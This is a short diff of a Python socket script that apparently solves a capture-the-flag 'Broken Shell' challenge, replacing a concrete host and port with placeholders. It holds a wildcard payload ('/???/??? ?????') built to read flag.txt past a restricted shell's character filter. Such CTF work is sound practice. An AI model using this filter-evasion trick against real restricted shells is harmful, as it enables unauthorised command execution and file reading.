@@ -2,14 +2,14 @@ import socket
 import time
 
 # Configuration
-HOST = "94.237.123.126"
-PORT = 34445
+HOST = "<TARGET_IP>"
+PORT = <TARGET_PORT>
 
 # Payload to read flag.txt using wildcard expansion
 payload = "/???/??? ?????"
 
 # Prompt to wait for before sending the payload
-PROMPT = b"Broken@Shell$ "
+PROMPT = b"<TARGET_SHELL_PROMPT>"
 
 def recv_until_prompt(s, prompt):
     buffer = b""
